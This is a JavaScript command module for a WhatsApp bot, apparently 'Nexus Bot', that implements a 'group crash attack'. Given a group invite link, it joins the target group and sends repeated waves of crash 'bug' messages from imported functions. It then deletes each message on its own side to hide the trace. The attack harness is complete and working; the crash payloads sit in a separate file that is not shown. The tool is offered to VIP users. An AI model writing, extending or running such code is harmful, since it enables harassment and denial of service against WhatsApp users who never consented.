import { VIPQueries } from "../../database/query.js"
import { VIPHelper } from "../../whatsapp/index.js"

export default {
  name: "gccrash",
  commands: ["gccrash", "gcc", "gcrash"],
  category: "bugmenu",
  description: "Send group crash bugs",
  usage: ".gccrash <group_link>",
  adminOnly: false,
  
  async execute(sock, sessionId, args, m) {
    try {
      const userTelegramId = VIPHelper.fromSessionId(sessionId)
      if (!userTelegramId) {
        await sock.sendMessage(m.chat, { text: "❌ Session error\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      const vipStatus = await VIPQueries.isVIP(userTelegramId)
      if (!vipStatus.isVIP) {
        await sock.sendMessage(m.chat, { text: "❌ VIP access required\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      if (!args || args.length === 0) {
        await sock.sendMessage(m.chat, { 
          text: "❌ Usage: .gccrash <group_link>\nExample: .gccrash https://chat.whatsapp.com/xxxxx\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙"
        }, { quoted: m })
        return
      }

      const groupLink = args.join(' ')
      
      // Extract group code from link
      const groupCodeMatch = groupLink.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)
      
      if (!groupCodeMatch) {
        await sock.sendMessage(m.chat, { text: "❌ Invalid group link\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      const groupCode = groupCodeMatch[1]
      
      let statusMsg = await sock.sendMessage(m.chat, { 
        text: `👥 *GROUP CRASH ATTACK*\n\n🔍 Checking group membership...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
      }, { quoted: m })

      let groupId = null
      let groupName = null
      let alreadyInGroup = false

      // Method 1: Try to get group info directly from invite code
      try {
        await sock.sendMessage(m.chat, { 
          text: `👥 *GROUP CRASH ATTACK*\n\n📡 Getting group info from invite code...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
          edit: statusMsg.key
        })

        const groupInfo = await sock.groupGetInviteInfo(groupCode)
        groupName = groupInfo.subject
        
        // Now try to find this group in our groups list by name
        const groups = await sock.groupFetchAllParticipating()
        
        for (const [id, group] of Object.entries(groups)) {
          if (group.subject === groupName) {
            groupId = id
            alreadyInGroup = true
            break
          }
        }

        if (groupId) {
          await sock.sendMessage(m.chat, { 
            text: `👥 *GROUP CRASH ATTACK*\n\n✅ Already in group: ${groupName}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
            edit: statusMsg.key
          })
          await new Promise(resolve => setTimeout(resolve, 1000))
        } else {
          // Not in group - try to join
          await sock.sendMessage(m.chat, { 
            text: `👥 *GROUP CRASH ATTACK*\n\n📥 Joining group: ${groupName}...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
            edit: statusMsg.key
          })
          
          try {
            groupId = await sock.groupAcceptInvite(groupCode)
            await sock.sendMessage(m.chat, { 
              text: `👥 *GROUP CRASH ATTACK*\n\n✅ Successfully joined: ${groupName}\n⏳ Waiting 2 seconds...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
              edit: statusMsg.key
            })
            await new Promise(resolve => setTimeout(resolve, 2000))
          } catch (joinError) {
            const errorMsg = joinError.message || joinError.toString()
            
            if (errorMsg.includes('already') || errorMsg.includes('participant') || joinError.output?.statusCode === 409) {
              // We're already in the group but couldn't find it by name - use groupGetInviteInfo result
              await sock.sendMessage(m.chat, { 
                text: `👥 *GROUP CRASH ATTACK*\n\n⚠️ Already in group but could not locate in list\n📝 Using group info from invite...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
                edit: statusMsg.key
              })
              
              // For already-in-group case, we need to find the actual group ID
              // Try alternative method to get group ID
              try {
                // Get updated groups list
                const updatedGroups = await sock.groupFetchAllParticipating()
                let found = false
                
                // Search by name more broadly
                for (const [id, group] of Object.entries(updatedGroups)) {
                  if (group.subject && group.subject.includes(groupName.substring(0, 10))) {
                    groupId = id
                    groupName = group.subject
                    found = true
                    break
                  }
                }
                
                if (!found) {
                  // Last resort: try to get ID from group metadata
                  throw new Error("Could not locate group ID")
                }
                
                await sock.sendMessage(m.chat, { 
                  text: `👥 *GROUP CRASH ATTACK*\n\n✅ Located group: ${groupName}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
                  edit: statusMsg.key
                })
                
              } catch (findError) {
                await sock.sendMessage(m.chat, { 
                  text: `❌ Could not determine group ID. Please make sure the bot is in the group and try again.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
                  edit: statusMsg.key
                })
                return
              }
            } else {
              await sock.sendMessage(m.chat, { 
                text: `❌ Failed to join group: ${errorMsg}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
                edit: statusMsg.key
              })
              return
            }
          }
        }
      } catch (infoError) {
        // Fallback: Try direct join without group info
        await sock.sendMessage(m.chat, { 
          text: `👥 *GROUP CRASH ATTACK*\n\n📥 Attempting direct join...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
          edit: statusMsg.key
        })
        
        try {
          groupId = await sock.groupAcceptInvite(groupCode)
          const groupMetadata = await sock.groupMetadata(groupId)
          groupName = groupMetadata.subject
          
          await sock.sendMessage(m.chat, { 
            text: `👥 *GROUP CRASH ATTACK*\n\n✅ Successfully joined: ${groupName}\n⏳ Waiting 2 seconds...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
            edit: statusMsg.key
          })
          await new Promise(resolve => setTimeout(resolve, 2000))
        } catch (joinError) {
          const errorMsg = joinError.message || joinError.toString()
          
          if (errorMsg.includes('already') || errorMsg.includes('participant') || joinError.output?.statusCode === 409) {
            await sock.sendMessage(m.chat, { 
              text: `❌ Already in group but could not locate it. Please ensure:\n• Bot is in the group\n• Group link is valid\n• Try using .gcinfo command first\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
              edit: statusMsg.key
            })
          } else {
            await sock.sendMessage(m.chat, { 
              text: `❌ Invalid group link or access denied: ${errorMsg}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
              edit: statusMsg.key
            })
          }
          return
        }
      }

      // Verify we have groupId before proceeding
      if (!groupId) {
        await sock.sendMessage(m.chat, { 
          text: "❌ Could not determine group ID\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙",
          edit: statusMsg.key
        })
        return
      }

      // Final verification - get group metadata
      try {
        const finalMetadata = await sock.groupMetadata(groupId)
        groupName = finalMetadata.subject
        
        await sock.sendMessage(m.chat, { 
          text: `👥 *GROUP CRASH ATTACK*\n\n🎯 Target Confirmed:\n📛 Name: ${groupName}\n🆔 ID: ${groupId}\n\n💣 Preparing attacks...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
          edit: statusMsg.key
        })
      } catch (metaError) {
        await sock.sendMessage(m.chat, { 
          text: `❌ Cannot access group metadata. Bot may have been removed.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
          edit: statusMsg.key
        })
        return
      }

      // Import bug functions only when needed
      const { buggccrash, buggcnewup } = await import("../../lib/buggers/bug.js")

      let progress = `👥 *GROUP CRASH ATTACK*\n\n🎯 Group: ${groupName}\n📱 ID: ${groupId}\n\n📊 *Progress:*\n\n`

      await sock.sendMessage(m.chat, { 
        text: progress + `💣 Initializing attacks...`,
        edit: statusMsg.key
      })

      const bugs = [
          { name: 'BugGcCrash', fn: () => buggccrash(sock, groupId), count: 5 },
        { name: 'BugGcNewup', fn: () => buggcnewup(sock, groupId), count: 5 },
        
      ]

      let totalWaves = 0
      let successCount = 0

      for (const bug of bugs) {
        progress += `🔄 ${bug.name}: `
        
        for (let i = 0; i < bug.count; i++) {
          try {
            const sentMsg = await bug.fn()
            
            // Delete message for myself only
            if (sentMsg && sentMsg.key) {
              try {
                await sock.chatModify(
                  { 
                    clear: { 
                      messages: [{ id: sentMsg.key.id, fromMe: true }] 
                    } 
                  }, 
                  groupId
                )
              } catch (deleteError) {
                // Silent fail for delete errors
              }
            }
            
            progress += `✓ `
            totalWaves++
            successCount++
          } catch (bugError) {
            progress += `✗ `
            // Continue with next iteration even if one bug fails
          }
          await new Promise(resolve => setTimeout(resolve, 200))
        }
        
        progress += `(${bug.count}/${bug.count})\n`
        
        await sock.sendMessage(m.chat, { 
          text: progress,
          edit: statusMsg.key
        })
      }

      progress += `\n✅ Attack completed on ${groupName}\n📦 Total waves: ${totalWaves}\n🎯 Success rate: ${successCount}/${totalWaves}`

      await sock.sendMessage(m.chat, { 
        text: progress,
        edit: statusMsg.key
      })

      return { success: true }
    } catch (error) {
      console.error("[GcCrash] Error:", error)
      await sock.sendMessage(m.chat, { text: `❌ Attack failed: ${error.message}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` }, { quoted: m })
      return { success: false }
    }
  }
}